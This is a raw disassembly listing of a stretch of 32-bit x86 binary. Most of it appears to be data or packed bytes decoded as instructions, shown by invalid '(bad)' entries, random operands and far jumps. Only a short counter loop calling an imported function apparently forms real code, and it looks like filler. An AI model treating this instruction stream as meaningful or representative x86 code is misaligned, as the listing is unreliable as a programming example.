  415a22:	ins    BYTE PTR es:[edi],dx
  415a23:	jne    0x415a0e
  415a25:	xlat   BYTE PTR ds:[ebx]
  415a26:	mov    al,0xdb
  415a28:	xchg   DWORD PTR [edi-0x5a],ecx
  415a2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a2c:	cmp    DWORD PTR [ecx+ecx*2],0xb7af08f0
  415a33:	mov    eax,0xc2590e16
  415a38:	shr    ebx,1
  415a3a:	mov    esi,0xf9e39402
  415a3f:	mov    ah,0x38
  415a41:	test   al,0x94
  415a43:	sub    al,0xd9
  415a45:	mov    ebx,0x5604c239
  415a4a:	mov    ebx,0xa487701e
  415a4f:	retf   0x388c
  415a52:	or     al,0x7b
  415a54:	or     ah,ah
  415a56:	lahf   
  415a57:	inc    esp
  415a58:	push   0xffffffb8
  415a5a:	enter  0x862e,0x58
  415a5e:	add    DWORD PTR [ebp+0x62a98683],ebx
  415a64:	mov    ds:0x116facd1,al
  415a69:	or     al,0x1b
  415a6b:	sbb    eax,0xdc20b3bb
  415a70:	neg    DWORD PTR [ebx-0x7b]
  415a73:	sbb    BYTE PTR [esi+0x1f02f821],bl
  415a79:	inc    esp
  415a7a:	cmp    eax,0xd62229a3
  415a7f:	jg     0x415af4
  415a81:	sbb    dl,BYTE PTR ss:[esi]
  415a84:	dec    DWORD PTR [ecx]
  415a86:	fnstsw ax
  415a88:	fild   QWORD PTR [eax]
  415a8a:	in     eax,dx
  415a8b:	add    eax,0xc3847ab
  415a90:	sbb    BYTE PTR [edi],bl
  415a92:	and    al,0xff
  415a94:	lds    eax,FWORD PTR [ecx]
  415a96:	inc    esp
  415a97:	adc    esi,DWORD PTR [eax+ebx*8]
  415a9a:	xor    al,dl
  415a9c:	sub    ecx,DWORD PTR [edi]
  415a9e:	xchg   esp,eax
  415a9f:	ins    DWORD PTR es:[edi],dx
  415aa0:	mov    al,ds:0xd7c49a80
  415aa5:	scas   eax,DWORD PTR es:[edi]
  415aa6:	das    
  415aa7:	test   DWORD PTR [edi],0xada91bac
  415aad:	in     eax,dx
  415aae:	aas    
  415aaf:	or     dh,BYTE PTR [ecx+0x724337cf]
  415ab5:	dec    ebp
  415ab6:	dec    ecx
  415ab7:	fist   WORD PTR [edx]
  415ab9:	pop    ebp
  415aba:	jb     0x415a4d
  415abc:	add    ecx,DWORD PTR [esi+ecx*8-0x6d3f4be8]
  415ac3:	sub    esp,ebx
  415ac5:	push   ds
  415ac6:	adc    eax,0x650c967c
  415acb:	je     0x415a4e
  415acd:	add    DWORD PTR [ebp+0x49c2c6f8],eax
  415ad3:	leave  
  415ad4:	(bad)  
  415ad5:	adc    eax,0x3572adf6
  415ada:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415adb:	or     al,0xe1
  415add:	sub    BYTE PTR [edi-0x6dde9baf],ah
  415ae3:	sar    BYTE PTR [ebp+0x2eeae9da],cl
  415ae9:	out    0x57,al
  415aeb:	cwde   
  415aec:	jg     0x415aef
  415aee:	push   ebx
  415aef:	pop    es
  415af0:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  415af2:	std    
  415af3:	xchg   edi,eax
  415af4:	test   BYTE PTR [ebx*4-0x1c146355],bh
  415afb:	or     BYTE PTR [edi+0x42],al
  415afe:	hlt    
  415aff:	fist   DWORD PTR [edi-0x2f]
  415b02:	add    ebx,eax
  415b04:	jl     0x415b82
  415b06:	call   FWORD PTR [edi+eiz*2]
  415b09:	jnp    0x415b12
  415b0b:	push   edi
  415b0c:	cmp    edx,DWORD PTR [ebp-0x5f]
  415b0f:	sbb    BYTE PTR [eax],0x58
  415b12:	(bad)  
  415b13:	push   cs
  415b14:	xor    ebx,ecx
  415b16:	mov    bh,0x22
  415b18:	iret   
  415b19:	retf   0xd734
  415b1c:	push   ebp
  415b1d:	sub    BYTE PTR [edx-0x40],dh
  415b20:	int    0x16
  415b22:	iret   
  415b23:	jg     0x415ad4
  415b25:	hlt    
  415b26:	loop   0x415ad0
  415b28:	das    
  415b29:	push   edx
  415b2a:	ror    BYTE PTR [esi-0x12d428ed],0x25
  415b31:	and    esp,ecx
  415b33:	jp     0x415af6
  415b35:	ja     0x415ad0
  415b37:	loope  0x415ac4
  415b39:	push   ebp
  415b3a:	or     al,0x33
  415b3c:	(bad)  
  415b3d:	mov    BYTE PTR [edx+eax*1+0x3272db],cl
  415b44:	mov    eax,DWORD PTR [ebp+0xc]
  415b47:	xor    eax,esi
  415b49:	add    eax,edi
  415b4b:	pop    edi
  415b4c:	pop    esi
  415b4d:	pop    ebx
  415b4e:	leave  
  415b4f:	ret    0x8
  415b52:	push   ebp
  415b53:	mov    ebp,esp
  415b55:	push   ecx
  415b56:	and    DWORD PTR ds:0x43101c,0x0
  415b60:	jmp    0x415b70
  415b65:	mov    eax,ds:0x43101c
  415b6a:	inc    eax
  415b6b:	mov    ds:0x43101c,eax
  415b70:	cmp    DWORD PTR ds:0x43101c,0x1b
  415b77:	jae    0x415bbd
  415b7d:	cmp    DWORD PTR ds:0x43101c,0x25
  415b84:	jne    0x415bb8
  415b8a:	push   0x5668
  415b8f:	push   DWORD PTR [ebp-0x24]
  415b92:	push   DWORD PTR [ebp-0x10]
  415b95:	push   DWORD PTR [ebp-0x20]
  415b98:	push   0x7cb6
  415b9d:	push   DWORD PTR [ebp-0x24]
  415ba0:	push   0x559a
  415ba5:	push   0x4b12
  415baa:	push   0x6519
  415baf:	push   DWORD PTR [ebp-0x28]
  415bb2:	call   DWORD PTR ds:0x42b030
  415bb8:	jmp    0x415b65
  415bbd:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  415bc4:	adc    DWORD PTR ds:0x432008,ecx
  415bca:	mov    eax,DWORD PTR [ebp+0x8]
  415bcd:	add    DWORD PTR ds:0x42f010,0x223f
  415bd7:	jmp    0x417f24
  415bdc:	into   
  415bdd:	or     al,0x6c
  415bdf:	jg     0x415c4d
  415be1:	fild   QWORD PTR [ebp-0x75]
  415be4:	dec    ebx
  415be5:	mov    ebp,0xfac818bc
  415bea:	loop   0x415c49
  415bec:	or     eax,0x52626147
  415bf1:	pop    edi
  415bf2:	bound  esp,QWORD PTR [edx+0x40]
  415bf5:	mov    al,ds:0x565c538e
  415bfa:	dec    eax
  415bfb:	cdq    
  415bfc:	cmp    DWORD PTR [eax-0x75dacdb5],edx
  415c02:	or     eax,0x98d6ffd6
  415c07:	dec    esp
  415c08:	mov    ch,BYTE PTR es:[edi-0x7d]
  415c0c:	add    eax,0x1d06a9a0
  415c11:	imul   ecx,eax,0x4
  415c14:	sti    
  415c15:	add    al,0x44
  415c17:	out    0x5b,al
  415c19:	call   esi
  415c1b:	push   cs
  415c1c:	cld    
  415c1d:	push   esi
  415c1e:	fs dec esi
  415c20:	retf   
  415c21:	cmp    dh,0xe1
  415c24:	stos   DWORD PTR es:[edi],eax
  415c25:	mov    ch,0xb8
  415c27:	daa    
  415c28:	xchg   esi,eax
  415c29:	sub    al,0xf9
  415c2b:	loop   0x415c8a
  415c2d:	popf   
  415c2e:	(bad)  
  415c2f:	out    dx,eax
  415c30:	lods   al,BYTE PTR ds:[esi]
  415c31:	adc    dh,ch
  415c33:	or     eax,0x57ed5af5
  415c38:	cmp    al,0x2c
  415c3a:	rcr    DWORD PTR [edx],1
  415c3c:	mov    al,BYTE PTR [edx-0x3c42e026]
  415c42:	jnp    0x415c12
  415c44:	dec    eax
  415c45:	scas   eax,DWORD PTR es:[edi]
  415c46:	stos   BYTE PTR es:[edi],al
  415c47:	jne    0x415bf9
  415c49:	mov    ebx,0x4e416d8b
  415c4e:	shl    BYTE PTR [eax-0x511ae079],0x28
  415c55:	push   edx
  415c56:	mov    ebp,0xfe6b18ca
  415c5b:	in     eax,dx
  415c5c:	jecxz  0x415c3a
  415c5e:	jo     0x415c28
  415c60:	and    esp,DWORD PTR [edi]
  415c62:	mov    ebx,0xff99f624
  415c67:	mov    ?,WORD PTR [ecx+esi*1-0x26]
  415c6b:	xchg   ecx,eax
  415c6c:	inc    esi
  415c6d:	loopne 0x415c6d
  415c6f:	fldenv [ecx+0x35]
  415c72:	push   ds
  415c73:	sbb    eax,0xa71d0146
  415c78:	xor    al,0xbb
  415c7a:	jb     0x415c5a
  415c7c:	mov    esp,0x73b6e3db
  415c81:	jecxz  0x415c89
  415c83:	pushf  
  415c84:	je     0x415ccd
  415c86:	ror    bh,0x21
  415c89:	neg    esp
  415c8b:	clc    
  415c8c:	(bad)  
  415c8d:	mov    bh,0x45
  415c8f:	inc    ecx
  415c90:	mov    al,ds:0xc8eb1887
  415c95:	(bad)  
  415c96:	mov    dl,0x5d
  415c98:	inc    ebp
  415c99:	pop    esp
  415c9a:	nop
  415c9b:	or     eax,0x223833ba
  415ca0:	xchg   ebp,eax
  415ca1:	cli    
  415ca2:	xor    BYTE PTR [esi],ah
  415ca4:	cmp    BYTE PTR [edx+eiz*4-0x52bc2192],dh
  415cab:	(bad)  [esi+ecx*2+0x58cb1624]
  415cb2:	ror    DWORD PTR [esi+0x66f1885a],cl
  415cb8:	ds jmp 0xb1262ced
  415cbe:	or     al,0x95
  415cc0:	push   es
  415cc1:	or     al,0x81
  415cc3:	call   0x25f2:0x23c69ab8
  415cca:	jmp    0x4baa:0x213b143b
  415cd1:	(bad)  
  415cd3:	sti    
  415cd4:	mov    edx,0xd9e33e98
  415cd9:	repnz ds push ebp
  415cdc:	(bad)  [edi]
  415cde:	sub    dl,al
  415ce0:	outs   dx,BYTE PTR ds:[esi]
  415ce1:	dec    edx
  415ce2:	sahf   
  415ce3:	repz xchg ebx,eax
  415ce5:	mov    eax,0x6b3a6f87
  415cea:	fisttp QWORD PTR ss:[edi+0x7e]
  415cee:	sbb    eax,0xd78168b2
  415cf3:	pushf  
  415cf4:	inc    DWORD PTR [ebp+edx*1+0x5c3aba21]
  415cfb:	inc    edx
  415cfc:	cli    
  415cfd:	bound  ebp,QWORD PTR [edx-0x15]
  415d00:	ret    0xca7c
  415d03:	mov    eax,0x2191b8d9
  415d08:	out    0xff,eax
  415d0a:	pop    ds
  415d0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d0c:	push   cs
  415d0d:	fiadd  DWORD PTR [eax+0x5e0e61cb]
  415d13:	jne    0x415d8c
  415d15:	add    al,bl
  415d17:	push   esp
  415d18:	cmp    eax,0x20adfdd0
  415d1d:	inc    ecx
  415d1e:	xor    ecx,eax
  415d20:	inc    DWORD PTR [esi+0x70]
  415d23:	cmp    al,0x95
  415d25:	xchg   DWORD PTR [edi+0x288a2ac],esp
  415d2b:	retf   
  415d2c:	and    dl,BYTE PTR [ebx+0x38]
  415d2f:	cwde   
  415d30:	mov    eax,ds:0xa7640ffb
  415d35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d36:	jp     0x415cba
  415d38:	adc    al,0x8c
  415d3a:	and    ebp,DWORD PTR [esi+ecx*4]
  415d3d:	ror    bh,1
  415d3f:	loopne 0x415d80
  415d41:	ds dec ebx
  415d43:	push   es
  415d44:	pop    es
  415d45:	mov    al,ds:0xf0fe1444
  415d4a:	xor    DWORD PTR [eax-0x681c4b2c],esp
  415d50:	(bad)  
  415d51:	(bad)  
  415d52:	mov    BYTE PTR [edx],dl
  415d54:	mov    cl,0xe1
  415d56:	in     eax,dx
  415d57:	xchg   ebx,eax
  415d58:	pop    esi
  415d59:	aas    
  415d5a:	je     0x415d9f
  415d5c:	out    0x73,eax
  415d5e:	jae    0x415cf7
  415d60:	(bad)  
  415d61:	out    dx,al
  415d62:	mov    ah,0xde
  415d64:	cmp    eax,0x63536483
  415d69:	cld    
  415d6a:	pop    esi
  415d6b:	ud1    ebp,DWORD PTR [ecx-0xf534b5f]
  415d72:	in     al,dx
  415d73:	out    dx,eax
  415d74:	out    dx,eax
  415d75:	push   0x63
  415d77:	add    al,0xb3
  415d79:	cmc    
  415d7a:	mov    cl,0x40
  415d7c:	out    0x68,eax
  415d7e:	nop
  415d7f:	aas    
  415d80:	mov    bh,0xd1
  415d82:	xchg   ebx,eax
  415d83:	ret    
  415d84:	int    0x7f
  415d86:	jle    0x415df2
  415d88:	sub    BYTE PTR [ecx-0x2],cl
  415d8b:	jge    0x415d2f
  415d8d:	push   0xffffff93
  415d8f:	rcr    bl,1
  415d91:	jecxz  0x415db5
  415d93:	push   esp
  415d94:	adc    BYTE PTR [esi],bh
  415d96:	and    ch,al
  415d98:	cmp    BYTE PTR [edi+ebx*1],dl
  415d9b:	neg    dl
  415d9d:	ficom  DWORD PTR [edi-0x45173664]
  415da3:	cli    
  415da4:	pop    ebx
  415da5:	or     BYTE PTR [eax-0x534f99c],cl
  415dab:	outs   dx,DWORD PTR ds:[esi]
  415dac:	jmp    0x415d68
  415dae:	xchg   edi,eax
  415daf:	cli    
  415db0:	pop    ecx
  415db1:	scas   eax,DWORD PTR es:[edi]
  415db2:	popa   
  415db3:	mov    eax,0x7c0fdaa3
  415db8:	das    
  415db9:	mov    bl,0xf0
  415dbb:	mov    ch,0x10
  415dbd:	dec    edx
  415dbe:	std    
  415dbf:	dec    eax
  415dc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415dc1:	jns    0x415d49
  415dc3:	add    bh,BYTE PTR [ebx]
  415dc5:	sbb    eax,0x761f4dd3
  415dca:	call   0xfedf4eee
  415dcf:	sahf   
  415dd0:	imul   ebp,DWORD PTR [ecx],0x29
  415dd3:	push   0x6
  415dd5:	or     bl,BYTE PTR [edx-0x43]
  415dd8:	mov    edx,0x3b68614c
  415ddd:	adc    al,0x52
  415ddf:	out    dx,eax
  415de0:	xchg   edx,eax
  415de1:	adc    bh,0x61
  415de4:	int3   
  415de5:	arpl   dx,ax
  415de7:	gs jmp 0x3485a39c
  415ded:	lock mov dl,0xba
  415df0:	sbb    ch,BYTE PTR [edx]
  415df2:	jle    0x415dd2
  415df4:	gs sbb eax,0x8b762699
  415dfa:	jl     0x415e18
  415dfc:	sub    al,0xf1
  415dfe:	jbe    0x415dc0
  415e00:	mov    al,ds:0xee519d14
  415e05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e06:	xor    bl,BYTE PTR [edx+0x5e]
  415e09:	(bad)  
  415e0a:	(bad)  
  415e0b:	fstp   QWORD PTR [ebx-0x1d]
  415e0e:	jo     0x415e2a
  415e10:	call   0xb7e0:0x25972027
  415e17:	jnp    0x415e90
  415e19:	cwde   
  415e1a:	shl    BYTE PTR [esi-0x75],0x37
  415e1e:	dec    ebp
  415e1f:	mov    edx,0x978e6e92
  415e24:	add    al,0xf9
  415e26:	dec    esi
  415e27:	jnp    0x415dcd
  415e29:	or     bh,BYTE PTR [ecx+0x4a]
  415e2c:	or     eax,ebx
  415e2e:	dec    edx
  415e30:	(bad)  
  415e32:	mov    ebx,0x96c46879
  415e37:	in     eax,0xa1
  415e39:	jmp    0x59d00190
  415e3e:	aaa    
  415e3f:	stos   BYTE PTR es:[edi],al
  415e40:	mov    ebp,0x6e9ddebe
  415e45:	inc    esp
  415e46:	outs   dx,DWORD PTR ds:[esi]
  415e47:	mov    ebx,0x12d2907f
  415e4c:	imul   ecx,DWORD PTR [ebp-0x5c1a12e9],0x232a621a
  415e56:	loop   0x415e4a
  415e58:	aad    0xeb
  415e5a:	push   ds
  415e5b:	or     ch,dh
  415e5d:	push   ebp
  415e5e:	enter  0x642,0x26
  415e62:	xchg   DWORD PTR [ebx+ecx*2-0x17],eax
  415e66:	xlat   BYTE PTR ds:[ebx]
  415e67:	mov    BYTE PTR [edi+eiz*2-0x7],cl
  415e6b:	iret   
  415e6c:	in     al,dx
  415e6d:	iret   
  415e6e:	cdq    
  415e6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e70:	add    ah,bh
  415e72:	xor    al,0x7b
  415e74:	and    bh,bh
  415e76:	push   esp
  415e77:	fdivr  QWORD PTR [eax]
  415e79:	mov    esi,0x788c9088
  415e7e:	enter  0xe11e,0x2e
  415e82:	cmp    esi,DWORD PTR [eax+0x6f]
  415e85:	test   eax,0x61a60bbb
  415e8a:	push   edx
  415e8b:	pop    esp
  415e8c:	push   0x2821237f
  415e91:	or     DWORD PTR gs:[ebp-0x7f],esi
  415e95:	dec    edx
  415e96:	jns    0x415e7a
  415e98:	je     0x415eda
  415e9a:	loop   0x415e5b
  415e9c:	fsub   QWORD PTR [eax+0x68]
  415e9f:	push   ss
  415ea0:	ficom  DWORD PTR [ecx]
  415ea2:	push   ecx
  415ea3:	cdq    
  415ea4:	xchg   BYTE PTR [esi+0x7e],bl
  415ea7:	aad    0x63
  415ea9:	jmp    0x611f:0x5c049e9
  415eb0:	std    
  415eb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415eb2:	lds    edi,FWORD PTR [eax]
  415eb4:	fimul  DWORD PTR [eax]
  415eb6:	fdivp  st(5),st
  415eb8:	adc    DWORD PTR [edi],ebp
  415eba:	inc    edx
  415ebb:	or     DWORD PTR [ebp-0x7a],eax
  415ebe:	cmp    bl,cl
  415ec0:	and    ecx,DWORD PTR [edx-0xf]
  415ec3:	push   0xfcaec2fb
  415ec8:	mov    cl,0x6c
  415eca:	sahf   
  415ecb:	loope  0x415ee8
  415ecd:	cmp    eax,0x38a64c07
  415ed2:	jb     0x415f20
  415ed4:	popa   
  415ed5:	les    eax,FWORD PTR [eax+0x2f2796a0]
  415edb:	test   BYTE PTR ds:0xf2e407ec,al
  415ee1:	fldcw  WORD PTR [ebx]
  415ee3:	and    al,0x61
  415ee5:	jmp    DWORD PTR [ecx-0x5c]
  415ee8:	mov    bl,0xd
  415eea:	jnp    0x415f63
  415eec:	in     eax,0xf0
  415eee:	es pushf 
  415ef0:	adc    bl,al
  415ef2:	bt     esi,esp
  415ef5:	jmp    0xc3214d0
  415efa:	fwait
  415efb:	not    BYTE PTR [esi-0x22]
  415efe:	pop    edx
  415eff:	aas    
  415f00:	jl     0x415e9b
  415f02:	sti    
  415f03:	(bad)  
  415f04:	jnp    0x415f02
  415f06:	arpl   dx,dx
  415f08:	inc    esi
  415f09:	push   edx
  415f0a:	jp     0x415ee1
  415f0c:	sbb    cl,BYTE PTR [ecx]
  415f0e:	and    BYTE PTR [edx],0xf3
  415f11:	rcl    BYTE PTR [ebp-0x5646a3bc],cl
  415f17:	jge    0x415ed4
  415f19:	cmp    ebx,DWORD PTR [edi]
  415f1b:	call   0x6c8a:0xdd150c25
  415f22:	or     dh,dh
  415f24:	sti    
  415f25:	mov    BYTE PTR [eax],cl
  415f27:	sbb    DWORD PTR [ecx-0x57d490ad],eax
  415f2d:	not    DWORD PTR [esi]
  415f2f:	outs   dx,BYTE PTR ds:[esi]
  415f30:	pop    edi
  415f31:	loopne 0x415f54
  415f33:	call   ebx
  415f35:	mov    cl,0x8
  415f37:	dec    ebx
  415f38:	xchg   BYTE PTR [edi-0x606db0e9],bh
  415f3e:	sub    dl,BYTE PTR [edx-0x35]
  415f41:	loop   0x415f8c
  415f43:	push   0x78
  415f45:	scas   eax,DWORD PTR es:[edi]
  415f46:	js     0x415ee9
  415f48:	stos   BYTE PTR es:[edi],al
  415f49:	sub    cl,BYTE PTR [edi]
  415f4b:	or     DWORD PTR [esi+0x5d],esi
  415f4e:	add    edi,DWORD PTR [eax+0x8]
  415f51:	(bad)  
  415f52:	pop    ds
  415f53:	vpslld ymm1,ymm0,XMMWORD PTR [ecx]
  415f57:	add    DWORD PTR es:[ebp+0x3a5a782],0x54
  415f5f:	je     0x415f6f
  415f61:	push   edi
  415f62:	fnsave [ebx-0x3c810f30]
  415f68:	pop    esi
  415f69:	inc    esi
  415f6a:	and    eax,DWORD PTR [eax-0x41]
  415f6d:	imul   ecx
  415f6f:	psrlq  mm5,QWORD PTR [edx-0x2ecf03ef]
  415f76:	jno    0x415fea
  415f78:	mov    al,ds:0x7440c487
  415f7d:	mov    ch,0x40
  415f7f:	dec    eax
  415f80:	call   0x835d:0xdf05a064
  415f87:	push   esp
  415f88:	(bad)  
  415f89:	pushf  
  415f8a:	mov    DWORD PTR [ecx+0x772c98c1],ecx
  415f90:	dec    eax
  415f91:	pusha  
  415f92:	mov    bl,0xa5
  415f94:	or     esp,0x10
  415f97:	inc    ebx
  415f98:	sar    BYTE PTR [ebx+ebp*4+0x1582405c],1
  415f9f:	pop    esp
  415fa0:	sub    BYTE PTR [esi+0x56330976],dl
  415fa6:	add    BYTE PTR [edi-0xa],0x49
  415faa:	sbb    dl,bh
  415fac:	mov    ?,WORD PTR [edx+0x0]
  415faf:	xchg   edi,eax
  415fb0:	adc    al,0x4
  415fb2:	sbb    DWORD PTR [eax-0x11],edi
  415fb5:	retf   
  415fb6:	rcr    BYTE PTR [edi+0x47],1
  415fb9:	cmp    DWORD PTR [ebp-0x4cf216e5],eax
  415fbf:	test   DWORD PTR [esi+0x4e],ebp
  415fc2:	inc    eax
  415fc3:	js     0x415f79
  415fc5:	lods   eax,DWORD PTR ds:[esi]
  415fc6:	xchg   ebp,eax
  415fc7:	fsub   DWORD PTR [ebp-0x64df4c82]
  415fcd:	jae    0x41601e
  415fcf:	and    ch,bl
  415fd1:	(bad)  
  415fd2:	sub    esi,ecx
  415fd4:	int3   
  415fd5:	xchg   esp,eax
  415fd6:	add    ebp,DWORD PTR [esi]
  415fd8:	pop    esi
  415fd9:	push   eax
  415fda:	push   0xcae02c8d
  415fdf:	pop    ebp
  415fe0:	ins    BYTE PTR es:[edi],dx
  415fe1:	lahf   
  415fe2:	addr16 push ebx
  415fe4:	scas   al,BYTE PTR es:[edi]
  415fe5:	jae    0x415f74
  415fe7:	outs   dx,DWORD PTR ds:[esi]
  415fe8:	pop    ds
  415fe9:	aam    0xbd
  415feb:	pushf  
  415fec:	xor    eax,0x88ea303
  415ff1:	rol    ah,1
  415ff3:	inc    DWORD PTR [ebx]
  415ff5:	outs   dx,BYTE PTR ds:[esi]
  415ff6:	fidivr DWORD PTR [esi+0x6c]
  415ff9:	sub    BYTE PTR [eax],0xaa
  415ffc:	dec    ebx
  415ffd:	cmp    edi,DWORD PTR [ebp+0x3fc90b43]
  416003:	int    0xf6
  416005:	cdq    
  416006:	dec    ebx
  416007:	sub    eax,0xc614e99c
  41600c:	and    eax,0x8f6fa7d7
  416011:	pop    ebx
  416012:	xchg   DWORD PTR [eax+0x34387fc7],esi
  416018:	adc    DWORD PTR [esi+0x834ab6a],edx
  41601e:	push   ss
  41601f:	stos   DWORD PTR es:[edi],eax
  416020:	je     0x415fc9
  416022:	mov    esp,0xbeba2dc9
  416027:	add    DWORD PTR [ebx+ebx*1+0x330986f2],ebp
  41602e:	push   ds
  41602f:	fwait
  416030:	out    0xd9,al
  416032:	dec    edi
  416033:	and    DWORD PTR ds:0xeda69f53,eax
  416039:	stos   BYTE PTR es:[edi],al
  41603a:	pop    esp
  41603b:	mov    eax,ds:0x1a6db8ce
  416040:	mov    edi,0x57e31f63
  416045:	xor    esp,DWORD PTR [ecx+edx*2]
  416048:	xor    al,0xc2
  41604a:	scas   al,BYTE PTR es:[edi]
  41604b:	lods   eax,DWORD PTR ds:[esi]
  41604c:	adc    al,0xbc
  41604e:	btr    DWORD PTR [ebx+0x3b],ebx
  416052:	mov    ebp,es
  416054:	sub    edx,DWORD PTR [esi-0x56]
  416057:	ror    BYTE PTR [edx+0x6c3c35f5],1
  41605d:	jmp    0x41600f
  41605f:	shl    DWORD PTR [eax-0x43],cl
  416062:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416063:	scas   al,BYTE PTR es:[edi]
  416064:	add    al,ch
  416066:	mov    ah,0x66
  416068:	jge    0x4160e2
  41606a:	int    0xb5
  41606c:	or     eax,DWORD PTR ss:[esi]
  41606f:	test   eax,0xd981ec67
  416074:	mov    ch,dh
  416076:	dec    ebx
  416077:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416078:	jle    0x416066
  41607a:	xchg   ebx,eax
  41607b:	cmp    al,0x22
  41607d:	lahf   
  41607e:	mov    ecx,0x58a3144d
  416083:	leave  
  416084:	repnz push edx
  416086:	push   cs
  416087:	inc    edi
  416088:	outs   dx,BYTE PTR ds:[esi]
  416089:	cmp    DWORD PTR ds:0x1d204a66,eax
  41608f:	and    DWORD PTR [ebx+0x67d9a027],edi
  416095:	add    DWORD PTR [edi],edx
  416097:	push   edi
  416098:	ror    BYTE PTR [edi],1
  41609a:	inc    eax
  41609b:	ret    
  41609c:	es push 0xc8340246
  4160a2:	stos   BYTE PTR es:[edi],al
  4160a3:	pop    es
  4160a4:	push   edx
  4160a5:	cli    
  4160a6:	pusha  
  4160a7:	mov    esp,0xab82cda
  4160ac:	cld    
  4160ad:	cmp    eax,0x9e3e5c2c
  4160b2:	mov    BYTE PTR [edi],bh
  4160b4:	xor    BYTE PTR [ebp-0x22792a56],dl
  4160ba:	fcomp  QWORD PTR [ebp-0x1e7fa573]
  4160c0:	inc    edi
  4160c1:	retf   
  4160c2:	ss icebp 
  4160c4:	pop    esi
  4160c5:	aaa    
  4160c6:	jmp    0x4160d5
  4160c8:	jmp    0xa8471157
  4160cd:	fdivr  QWORD PTR [edx]
  4160cf:	jns    0x4160d8
  4160d1:	inc    edx
  4160d2:	push   ss
  4160d3:	ins    BYTE PTR es:[edi],dx
  4160d4:	pop    ds
  4160d5:	dec    edi
  4160d6:	out    0x43,eax
  4160d8:	pusha  
  4160d9:	pop    esp
  4160da:	idiv   dl
  4160dc:	push   DWORD PTR [ebx-0x70e1af5f]
  4160e2:	mov    ebp,edi
  4160e4:	ficom  DWORD PTR [edx]
  4160e6:	fstp   DWORD PTR [esi]
  4160e8:	mov    dh,BYTE PTR [ecx-0x75540790]
  4160ee:	push   esp
  4160ef:	xchg   esi,eax
  4160f0:	fisub  WORD PTR [edi+0x58]
  4160f3:	dec    ebp
  4160f4:	and    eax,0x41571ce7
  4160f9:	inc    edx
  4160fa:	mov    al,ch
  4160fc:	mov    al,ds:0xaa692e3c
  416101:	inc    edi
  416102:	mov    cs,edx
  416104:	aas    
  416105:	aad    0x7d
  416107:	scas   al,BYTE PTR es:[edi]
  416108:	and    DWORD PTR [ebx],ebx
  41610a:	popf   
  41610b:	cli    
  41610c:	js     0x41613a
  41610e:	adc    ah,dl
  416110:	dec    edi
  416111:	adc    al,0x90
  416114:	push   ecx
  416115:	fs mov edi,0x48d6d0f0
  41611b:	xor    edx,esi
  41611d:	(bad)  
  41611e:	aad    0x9b
  416120:	out    dx,eax
  416121:	or     cl,BYTE PTR [eax+0x4f]
  416124:	or     ecx,0x56
  416127:	push   es
  416128:	or     bh,BYTE PTR ds:[ebx]
  41612b:	popf   
  41612c:	adc    DWORD PTR [eax+0x5e556936],esi
  416132:	fisttp QWORD PTR [ebp-0x2ee27d26]
  416138:	lods   al,BYTE PTR ds:[esi]
  416139:	mov    edi,cs
  41613b:	fist   WORD PTR [edi]
  41613d:	mul    DWORD PTR ds:0xb36e991c
  416143:	js     0x41617f
  416145:	inc    edx
  416146:	icebp  
  416147:	sbb    edi,edi
  416149:	test   BYTE PTR [ecx-0x1c],dh
  41614c:	sar    ah,cl
  41614e:	iret   
  41614f:	mov    DWORD PTR [edi],edx
  416151:	mov    ds:0x75848e12,al
  416156:	retf   0x3b6a
  416159:	in     al,0xc
  41615b:	std    
  41615c:	pop    edi
  41615d:	pop    ss
  41615e:	test   al,0xd4
  416160:	int3   
  416161:	fistp  QWORD PTR [ebp+0x2034974c]
  416167:	or     BYTE PTR [eax+0x5c],bh
  41616a:	jge    0x416143
  41616c:	cmp    esp,DWORD PTR [ebx]
  41616e:	sahf   
  41616f:	xor    edi,0x28
  416172:	push   cs
  416173:	push   edi
  416174:	jo     0x416106
  416176:	push   edi
  416177:	fsub   st(6),st
  416179:	mov    esi,0x4975820b
  41617e:	arpl   di,di
  416180:	mov    gs,WORD PTR [ebx]
  416182:	(bad)  
  416183:	and    bl,BYTE PTR [ecx]
  416185:	ins    BYTE PTR es:[edi],dx
  416186:	enter  0xc614,0xfb
  41618a:	dec    BYTE PTR [eax-0x5c0cea74]
  416190:	cmp    BYTE PTR [eax],al
  416192:	xchg   esp,eax
  416193:	cmp    BYTE PTR [ebp-0x10],cl
  416196:	xchg   ebp,eax
  416197:	mov    al,ds:0x47fae930
  41619c:	mov    edi,0x6628a3c2
  4161a1:	idiv   BYTE PTR [esi]
  4161a3:	hlt    
  4161a4:	cld    
  4161a5:	ror    DWORD PTR [edi+0x5361e82],0xac
  4161ac:	fnstcw WORD PTR ds:0x60d05677
  4161b2:	into   
  4161b3:	and    BYTE PTR [edx+edx*1],dl
  4161b6:	pop    ebx
  4161b7:	mov    dl,0x39
  4161b9:	dec    esp
  4161ba:	in     al,0xa2
  4161bc:	push   cs
  4161bd:	add    BYTE PTR [ebx],ah
  4161bf:	mov    ebx,0xaaca0ed4
  4161c4:	test   cl,al
  4161c6:	stos   DWORD PTR es:[edi],eax
  4161c7:	repz repz xor DWORD PTR fs:[ebp-0x2905684f],ebp
  4161d0:	leave  
  4161d1:	mov    bl,BYTE PTR [esp+esi*4-0x42]
  4161d5:	inc    edx
  4161d6:	jae    0x416185
  4161d8:	lahf   
  4161d9:	jge    0x416212
  4161db:	push   0x8dcc1f07
  4161e0:	xlat   BYTE PTR ds:[ebx]
  4161e1:	bswap  esi
  4161e3:	xchg   ebx,eax
  4161e4:	ins    DWORD PTR es:[edi],dx
  4161e5:	fisttp WORD PTR [edi-0x42]
  4161e8:	ds mov esp,0x6415b623
  4161ee:	(bad)  
  4161ef:	sbb    BYTE PTR [eax-0x45dac590],dh
  4161f5:	adc    BYTE PTR [edi],dl
  4161f7:	cmp    BYTE PTR [ebx-0x541996c9],dl
  4161fd:	(bad)
  416200:	push   ebx
  416201:	daa    
  416202:	stc    
